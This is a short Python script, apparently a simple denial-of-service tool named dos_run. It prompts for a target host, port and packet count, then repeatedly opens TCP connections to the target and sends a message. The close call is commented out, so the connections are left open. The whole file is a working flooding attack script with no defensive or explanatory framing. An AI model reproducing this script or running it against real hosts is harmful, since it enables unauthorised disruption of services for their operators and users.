import socket

if __name__ == '__main__':	

	host = input("Enter Host: ")
	host = host.replace("http://", "")
	open_port = int(input("Open Port: "))
	conn = input("Number of Packets: ")
	message = "hi"
	message = message.encode("ascii")

	def dos_run(host, port):
		cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		cs.connect((host, port))
		cs.send(message)
		#cs.close()    	   		

	for i in range(int(conn)):
		dos_run(host, open_port)
		i += 1
		print(i)
